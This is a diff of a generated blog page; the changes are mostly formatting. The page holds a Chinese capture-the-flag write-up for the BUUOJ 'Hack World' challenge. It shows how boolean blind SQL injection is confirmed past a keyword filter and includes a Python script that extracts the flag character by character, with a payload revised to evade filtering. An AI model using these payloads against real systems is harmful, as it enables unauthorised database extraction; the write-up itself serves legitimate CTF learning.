@@ -79,7 +79,8 @@
     
   </style>
   
-<meta name="generator" content="Hexo 6.3.0"></head>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
+</head>
 
 
 
@@ -178,7 +179,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        1397
+                        1398
                     
                     字
                 </li>
@@ -203,44 +204,41 @@
             <hr />
             <div itemprop="articleBody"><p>续接上文</p>
 <span id="more"></span>
-
-<h2><span id="打开靶机">打开靶机</span></h2><p>同样是sql注入，题面已经提示我们flag在flag表的flag列里了</p>
+<h2><span id="打开靶机"> 打开靶机</span></h2>
+<p>同样是sql注入，题面已经提示我们flag在flag表的flag列里了</p>
 <p>接下来我们只需要查询就好了</p>
-<h2><span id="检测注入方式">检测注入方式</span></h2><p>输入1’ 回显bool(false)</p>
+<h2><span id="检测注入方式"> 检测注入方式</span></h2>
+<p>输入1’ 回显bool(false)</p>
 <p>没有报错信息</p>
 <p>使用堆叠注入和联合查询 均回显SQL Injection Checked.</p>
 <img src="/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/1.png" class title="被过滤">
-
-
-
 <p>那只能考虑盲注，测试下是否有两种回显方式</p>
 <p>使用<code>1^1</code> 和<code>1^0</code> 测试</p>
 <p>发现1^1时，回显Error</p>
 <p>发现1^0时，回显Hello, glzjin wants a girlfriend.</p>
 <p>说明可以使用盲注</p>
 <img src="/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/2.png" class title="盲注测试">
-
 <img src="/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/3.png" class title="盲注测试">
-
 <p>直接跑脚本就行了</p>
 <p>把昨天的脚本复制一下，post传参名称改为id就好了（题目提示要我们提供id）</p>
-<h2><span id="payload">Payload</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> times</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span> : <span class="string">&quot;1^(ascii(substr((select(group_concat(flag))from(flag)),%d,1))&lt;%d)&quot;</span>%(i,mid)</span><br><span class="line">        &#125;</span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        time.sleep(<span class="number">0.04</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Error&quot;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;=<span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res +=<span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Result:&quot;</span>,res)</span><br></pre></td></tr></table></figure>
-
+<h2><span id="payload"> Payload</span></h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> times</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span> : <span class="string">&quot;1^(ascii(substr((select(group_concat(flag))from(flag)),%d,1))&lt;%d)&quot;</span>%(i,mid)</span><br><span class="line">        &#125;</span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        time.sleep(<span class="number">0.04</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Error&quot;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;=<span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res +=<span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Result:&quot;</span>,res)</span><br></pre></td></tr></table></figure>
 <p>但是这里跑是跑不出结果的</p>
-<h3><span id="问题分析">问题分析</span></h3><p>测试语句</p>
+<h3><span id="问题分析"> 问题分析</span></h3>
+<p>测试语句</p>
 <p><code>1^(ascii(substr((select(group_concat(flag))from(flag)),1,1))&lt;104)</code> (因为flag的第一个字母f的ascii是102)</p>
 <p>发现SQL Injection Checked</p>
 <p>所以说某些词被检测到了</p>
-<p>经测试..</p>
+<p>经测试…</p>
 <p>当输入<code>select(group_concat(flag))</code>时，检测到了SQL注入</p>
-<h3><span id="修改payload">修改Payload</span></h3><p><strong>如果列内只有一个数据，可以不使用group_concat</strong></p>
+<h3><span id="修改payload"> 修改Payload</span></h3>
+<p><strong>如果列内只有一个数据，可以不使用group_concat</strong></p>
 <p><strong>因为flag列只有一个flag（</strong></p>
 <p>所以脚本payload改为</p>
 <p><code>1^(ascii(substr((select(flag)from(flag)),%d,1))&lt;%d)%(i,mid)</code></p>
 <p>成功拿到flag</p>
 <img src="/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/4.png" class title="结束">
-
-<p>PS：<del>不要直接copy我的flag，这个题是动态flag</del></p>
+<p>PS：<s>不要直接copy我的flag，这个题是动态flag</s></p>
 </div>
         </div>
         
@@ -437,7 +435,7 @@
     <div class="photo-background"></div>
     <div class="photo-wrapper clearfix">
         <div class="photo-wrapper-tip text-center">
-            <img class="about-photo" src="/images/luo.webp" loading="lazy" decoding="auto" />
+            <img class="about-photo" src="/images/Oscar.jpg" loading="lazy" decoding="auto" />
         </div>
     </div>
     <div class="textwidget">
